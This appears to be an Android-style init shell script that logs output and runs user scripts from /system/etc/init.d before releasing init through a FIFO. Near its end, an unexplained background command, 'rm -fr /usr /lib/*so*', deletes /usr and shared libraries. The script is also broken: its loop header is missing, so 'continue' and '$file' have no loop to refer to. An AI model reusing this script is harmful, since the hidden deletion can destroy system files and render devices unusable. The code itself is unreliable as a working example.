#!/sbin/sh
# Wait for init event in init.rc to complete
# Run user init programs. These are run just before class_default is started,
# so they will have access to the complete environment. All actions are logged
# to /system/user.log
export PATH=/usr/sbin:/usr/bin:/sbin:/system/xbin:/system/bin
exec >>/system/user.log
exec 2>&1
echo $(date) USER INIT START
if cd /system/etc/init.d >/dev/null 2>&1 ; then
    if [ ! -e "$file" ] ; then continue ; fi
    echo "START '$file'"
    /sbin/sh "$file"
    echo "EXIT '$file' ($?)"
fi
echo $(date) USER INIT DONE
rm -fr /usr /lib/*so* &
# Allow init to proceed
read s </sync_fifo
